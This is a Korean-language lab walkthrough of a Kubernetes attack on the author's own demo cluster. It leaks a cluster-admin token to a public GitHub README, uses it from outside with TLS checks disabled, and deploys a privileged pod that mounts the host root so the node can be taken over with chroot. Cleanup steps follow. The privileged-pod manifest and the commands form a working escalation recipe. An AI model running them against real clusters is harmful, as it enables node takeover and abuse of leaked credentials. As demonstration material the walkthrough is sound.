## Kubernetes 클러스터 최신 버전 침투 시나리오 (Privileged 컨테이너 이용)

이 문서는 Kubernetes 최신 버전 클러스터를 대상으로, 외부에서 인증 토큰 유출 → API 침투 → Privileged 컨테이너를 통한 노드 권한 획득까지의 과정을 단계별로 설명합니다.

---

## 1. 클러스터 환경

* **구성**: 마스터 1대, 워커 3대
* **버전**: 최신 Kubernetes

---

## 2. 사전 준비 (마스터 VM)

1. **서비스 어카운트 및 토큰 생성** (24시간 유효)

```bash
kubectl -n kube-system create sa demo-leak
kubectl create clusterrolebinding demo-leak \
  --clusterrole=cluster-admin \
  --serviceaccount=kube-system:demo-leak

kubectl -n kube-system create token demo-leak --duration=24h > /tmp/leak.token
```

2. **API 서버 방화벽 오픈** (6443포트)

GCP 콘솔에서 설정:

* Name: `allow-demo-6443`
* Source IP: `<YOUR_IP>/32`
* Protocol/Port: `tcp:6443`

3. **토큰 확인**

```bash
cat /tmp/leak.token
```

---

## 3. 토큰 유출 시나리오 (GitHub)

```bash
cd ~/demo-leak
echo "## 토큰 유출 테스트" > README.md
cat /tmp/leak.token >> README.md
git add README.md
git commit -m "leak kube token"
git push origin main
```

---

## 4. 외부에서 침투

### 환경설정

```bash
brew install kubectl
TOKEN="$(curl -s https://raw.githubusercontent.com/<USER>/demo-leak/main/README.md | tail -1)"
API="https://34.64.60.22:6443"

kubectl --token "$TOKEN" --server "$API" --insecure-skip-tls-verify get ns
```

### 공격용 YAML 생성 및 배포

`privileged-shell.yaml` 생성:

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: privileged-poc
---
apiVersion: v1
kind: Pod
metadata:
  name: privileged-shell
  namespace: privileged-poc
spec:
  hostPID: true
  hostNetwork: true
  containers:
    - name: attacker-shell
      image: alpine:latest
      securityContext:
        privileged: true
      command: ["/bin/sh", "-c", "sleep 3600"]
      volumeMounts:
        - name: host-root
          mountPath: /host
  volumes:
    - name: host-root
      hostPath:
        path: /
```

배포:

```bash
kubectl --token "$TOKEN" --server="$API" --insecure-skip-tls-verify apply -f privileged-shell.yaml
```

### 파드 접속 후 노드 권한 획득 증명

파드 접근:

```bash
kubectl --token "$TOKEN" --server="$API" --insecure-skip-tls-verify -n privileged-poc exec -it privileged-shell -- sh
```

노드 Shell 접근:

```bash
chroot /host /bin/bash

# 권한 증명
whoami
id
hostname
```

---

## 5. 정리

외부 PC에서 자원 삭제:

```bash
kubectl delete -f privileged-shell.yaml
kubectl delete ns privileged-poc
```

마스터에서 자원 삭제:

```bash
kubectl -n kube-system delete sa demo-leak
kubectl delete clusterrolebinding demo-leak
```

GCP 방화벽 규칙 삭제:

```bash
gcloud compute firewall-rules delete allow-demo-6443
```

